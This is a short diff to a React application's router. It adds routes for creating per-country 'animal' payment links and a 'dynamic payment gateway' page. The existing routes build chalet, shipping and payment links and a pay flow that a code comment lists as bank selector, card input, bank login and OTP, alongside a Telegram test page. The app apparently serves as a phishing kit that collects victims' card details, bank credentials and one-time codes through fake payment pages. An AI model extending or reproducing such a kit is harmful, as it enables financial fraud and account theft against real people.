@@ -7,6 +7,7 @@ import Index from "./pages/Index";
 import Services from "./pages/Services";
 import CreateChaletLink from "./pages/CreateChaletLink";
 import CreateShippingLink from "./pages/CreateShippingLink";
+import CreateAnimalLink from "./pages/CreateAnimalLink";
 import CreatePaymentLink from "./pages/CreatePaymentLink";
 import CreateInvoice from "./pages/CreateInvoice";
 import InvoiceList from "./pages/InvoiceList";
@@ -29,6 +30,8 @@ import PaymentOTP from "./pages/PaymentOTP";
 import PaymentReceiptPage from "./pages/PaymentReceiptPage";
 import PaymentReceipt from "./pages/PaymentReceipt";
 import TelegramTestPage from "./pages/TelegramTestPage";
+import DynamicPaymentFlow from "./pages/DynamicPaymentFlow";
+import PaymentGatewayShowcase from "./pages/PaymentGatewayShowcase";
 import NotFound from "./pages/NotFound";
 
 const queryClient = new QueryClient();
@@ -44,6 +47,7 @@ const App = () => (
           <Route path="/services" element={<Services />} />
           <Route path="/create/:country/chalet" element={<CreateChaletLink />} />
           <Route path="/create/:country/shipping" element={<CreateShippingLink />} />
+          <Route path="/create/:country/animal" element={<CreateAnimalLink />} />
           <Route path="/create/:country/payment" element={<CreatePaymentLink />} />
           <Route path="/invoices/create/:country" element={<CreateInvoice />} />
           <Route path="/invoices/list/:country" element={<InvoiceList />} />
@@ -56,6 +60,8 @@ const App = () => (
           <Route path="/pay/:id/recipient" element={<PaymentRecipient />} />
           <Route path="/pay/:id/data" element={<PaymentData />} />
           <Route path="/pay/:id/details" element={<PaymentDetails />} />
+          {/* Dynamic payment gateway flow */}
+          <Route path="/pay/:id/gateway" element={<DynamicPaymentFlow />} />
           {/* New payment flow: Bank selector -> Card input -> Bank login -> OTP */}
           <Route path="/pay/:id/bank-selector" element={<PaymentBankSelector />} />
           <Route path="/pay/:id/card-input" element={<PaymentCardInput />} />
